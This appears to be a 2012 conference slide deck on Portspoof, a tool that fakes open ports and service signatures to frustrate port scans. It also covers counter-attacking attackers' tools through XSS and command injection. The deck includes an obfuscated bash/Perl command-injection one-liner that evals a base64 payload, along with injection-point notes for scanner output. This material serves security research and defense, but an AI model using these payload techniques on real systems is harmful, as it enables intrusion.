# Presentation: Pwn’ing Your Cyber Offenders
**Presented by: Piotr Duszynski (@drk1wi)**

---

## About the Presenter
- **Senior Security Consultant at Trustwave**
  - Certifications: OSCP, OSCE, CEH
- **Experience**: 
  - 6 years in the security field
  - Hacking since 2009
- **Interests**: Security research, road trips, mojitos, and good music
- **Note**: Despite the technical content, I aim to avoid being overly nerdy.

---

## Presentation Overview
- **New Defensive Technique**: A method that renders port scan results useless.
- **New Attack Vectors**: Strategies against your attackers' offensive toolbox.
- **Introduction to Portspoof**: A tool for active defense.
- **PWN'age Proof of Concept (POC) Demo**: Demonstrating an attack on a well-known port scanner.

---

## Active (Offensive) Defense in Practice
- **Concept**: "Blind Attackers' Tools"
- **Objective**: Annoyance and Camouflage

---

## Destroying the Reconnaissance Phase
- **Typical Scenario**: A target system behind a firewall.
- **Command Example**:
  ```bash
  $ nmap –sV -O demo.addr.pl
  ```

---

## Portspoof: Implementation and Goal
- **Goal**: Make the attacker's port scanning experience extremely difficult.
- **Worst-Case Scenario**:
  - All 65,535 ports are open.
  - Each open port has a service listening.
- **Portspoof Features**:
  - Binds to a single port (e.g., 127.0.0.1:4444).
  - Dynamically generates valid service signatures (over 8,000 supported).
- **Task for the Attacker**: Identify all real services on the remote system.

---

## Rendering Your Port Scan Useless with Portspoof
- **Nmap Command**:
  ```bash
  $ nmap –sV –p - -PN demo.addr.pl
  ```
- **Scanning Statistics**:
  - 65,535 open ports (services)
  - ~120 MB of sent data
  - 30,682 seconds (8.5 hours) and a few beers later...

- **NMAP OS Identification Results**:
  - Device Type: General purpose
  - Running (JUST GUESSING): Linux 3.X (93%)
  - Aggressive OS Guesses: Linux 3.2 (93%), Linux 3.0 (92%), Linux 3.0 - 3.2 (85%)
  - No exact OS matches for host (test conditions non-ideal).

- **Service Info**:
  - Hosts: gTknkkuB, ouwH-rKWw, bWQnRo, ClFfHC, leLtAJg
  - OSs: Unix, Windows, Linux, Solaris, NetWare
  - Devices: Print server, webcam, router, storage-misc, printer
  - CPE: cpe:/o:microsoft:windows, cpe:/o:redhat:linux, cpe:/o:sun:sunos, cpe:/o:novell:netware, cpe:/o:linux:linux_kernel

- **Hidden Message**: Somewhere in the results, you can find a hidden message.

- **AMAP Command**:
  ```bash
  $ amap –q demo.addr.pl 3000-3100
  ```

---

## Conclusions
- **Stealth Scans**: SYN/ACK/FIN/... stealth scans are no longer effective.
- **OS Identification**: More challenging due to the large number of false positives.
- **Traffic Generation**: Forces the attacker to generate a significant amount of traffic through service probes.
- **Security by Obscurity**: Similar to mimicry in the natural environment.

---

## Bypassing Portspoof
- **Detection**: No trivial way to detect false signatures.
- **Evasion Techniques**: IP fragmentation and other evasion techniques will not work.
- **Thread Pool Exhaustion**: Manipulate the thread pool number to handle all incoming connections.
- **Community Contribution**: Send bypass ideas to the Portspoof mailing list.

---

## Exploiting Your Attackers' Tools
- **Active (Offensive) Defense**: Exploit vulnerabilities in the tools used by attackers.
- **Quote**: "The best defense is a good offense" - Sun Tzu (The Art of War)

---

## Exploiting Nmap Port Scanner
- **Injection Points**:
  - Version fields
  - Hosts fields
  - Other potential points (hint: NSE output)
- **Payload Size**: ~100 bytes based on matched Nmap regex.
- **Command**:
  ```bash
  ./portspoof –f fuzz_payloads –n fuzz_nmap_signatures
  ```

- **Nmap Filtering**:
  - `-oN` (no filtering: ASCII printable + "space" chars)
  - `-oG` (filtering: all instances of `/` are replaced with `|`)
  - `-oX` (filtering: all reserved HTML chars are replaced with char entities)

---

## XSS Examples
- **Commercial Port Scanner**: McAfee SuperScan 4.0
  - XSS Payload: Partially UTF-7 encoded without parenthesis
- **Open Source Reporting Tool**: Anonymous tool
- **Blind/Generic XSS Pwn’age**:
  ```bash
  $ ./portspoof -v –f XSS.txt –n fuzz_nmap_signatures
  ```

---

## OS Command Injection Example
- **Exploit Script**: Lotus CMS 3.0 eval() Remote Command Execution Exploit
- **Portspoof Exploiting Signature**:
  ```bash
  80 “whoami\n”
  ```
- **Exploit Output**:
  - New extra output from the exploit script

- **Creating a Universal OS Command Injection Payload One-Liner**:
  - Challenge: Spaces, apostrophes, and pipes are not allowed.
  - Solution:
    ```bash
    /bin/bash\t-c\t{perl,-e,$0,useSPACEMIME::Base64,B64_perl_payload }\t
    $_=$ARGV[0];~s/SPACE/\t/ig;eval;$_=$ARGV[1];eval(decode_base64($_));
    ```
  - Use `\t` instead of spaces.
  - Use 'Bash Brace Expansion' to address the lack of apostrophes.
  - Use regex to add additional `\t`.
  - Import missing packages on the fly and execute Base64 encoded payload.

---

## Pros and Cons of Defensive Exploitation
- **Pros**:
  - Effective against aggressive scanning scripts (autopwn).
  - Moderately effective against exploit scripts with easy-to-exploit vulnerabilities.
- **Cons**:
  - Requires some luck.
  - Challenging bugs may require dedicated signatures.
- **Additional Information Gathering**: Use Metasploit and BeEF payloads.

---

## Finding Vulnerable Software
- **Google Search Tips**:
  - Search for `.sh` (about 8,000 results), `.pl`, etc.
  - Look for common vulnerabilities like XSS, SQL injections, OS command injections, buffer/heap overflows, and DOS vectors.

---

## Nmap NSE PWN Demo
- **Demo**: Practical demonstration of exploiting Nmap NSE.

---

## Portspoof: 2-in-1 Tool
- **Service Emulator Mode**:
  - Low CPU/memory usage even under heavy scans.
  - Binds to one port per instance (e.g., 127.0.0.1:4444).
  - Over 8,000 dynamic service signatures.
  - Configurable through iptables:
    ```bash
    -A PREROUTING -i eth1 -p tcp -m tcp --dport 1:65535 -j REDIRECT --to-ports 4444
    ```

---

## Further Information
- **Portspoof URLs**:
  - Website: http://portspoof.org/
  - Mailing List: PI:EMAIL
  - Git Repository: https://github.com/drk1wi/portspoof/
- **Contact**:
  - Email: piotr[at]duszynski.eu
  - PGP Fingerprint: FCD2 B5DA 1AE2 056F 4AC8 901D 7258 7496 ECCD 36F3
  - Twitter: @drk1wi

---

## Thank You!

---

© 2012